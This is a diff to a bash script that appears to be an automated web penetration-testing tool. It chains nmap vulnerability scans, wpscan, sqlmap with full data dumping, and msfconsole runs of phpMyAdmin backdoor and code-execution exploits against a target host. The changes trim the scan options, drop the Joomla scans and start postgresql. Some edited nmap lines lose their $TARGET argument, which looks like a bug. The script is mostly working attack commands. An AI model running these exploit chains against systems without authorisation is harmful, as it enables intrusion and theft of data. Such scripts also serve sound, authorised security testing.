@@ -323,6 +323,9 @@ else
 	echo -e "$OKGREEN################################### Running UDP port scan ##########################$RESET"
 	nmap -sU -T5 -p U:$OPT1 --open $TARGET
 fi
+
+service postgresql start 2> /dev/null
+
 echo ""
 echo -e "$OKGREEN################################### Running Intrusive Scans ########################$RESET"
 port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
@@ -483,15 +486,16 @@ else
 	
 	if [ "$MODE" = "web" ]
 	then
-		nmap -v -sV -T5 -p 80 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,http-phpmyadmin-dir-traversal $TARGET
+		nmap -sV -T5 -p 80 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
 		dirb http://$TARGET
 		wpscan --url http://$TARGET --batch
+		echo ""
 		wpscan --url http://$TARGET/wordpress/ --batch
-		joomscan -u http://$TARGET
-		joomscan -u http://$TARGET/joomla/
+		echo ""
 		python $CMSMAP -t http://$TARGET
+		echo ""
 		python $CMSMAP -t http://$TARGET/wordpress/
-		#arachni http://$TARGET --output-only-positives
+		echo ""
 		uniscan -u http://$TARGET -qweds
 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
@@ -632,15 +636,15 @@ else
 	
 	if [ "$MODE" = "web" ]
 	then
-		nmap -v -sV -T5 -p 443 --script=http-enum,http-feed,http-open-proxy,http-headers,http-cors,http-server-header,http-php-version,http-form-brute,http-iis-short-name-brute,http-waf-fingerprint,http-auth,http-trace,http-iis-webdav-vuln,http-useragent-tester,http-vuln-cve2011-3368,http-userdir-enum,http-passwd,http-csrf,http-wordpress-enum,http-frontpage-login,http-dombased-xss,http-phpself-xss,http-sql-injection,http-drupal-enum-users,http-referer-checker,http-vuln-cve2009-3960,http-methods,http-open-redirect,http-vuln-cve2011-3192,http-stored-xss,http-vuln-cve2013-0156,http-put,http-proxy-brute,http-rfi-spider,http-method-tamper,tls-nextprotoneg,ssl* $TARGET
+		nmap -sV -T5 -p 443 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
 		dirb https://$TARGET
 		wpscan --url https://$TARGET --batch
+		echo ""
 		wpscan --url https://$TARGET/wordpress/ --batch
-		joomscan -u https://$TARGET
-		joomscan -u https://$TARGET/joomla/
 		python $CMSMAP -t https://$TARGET
+		echo ""
 		python $CMSMAP -t https://$TARGET/wordpress/
-		#arachni https://$TARGET --output-only-positives
+		echo ""
 		uniscan -u https://$TARGET -qweds
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
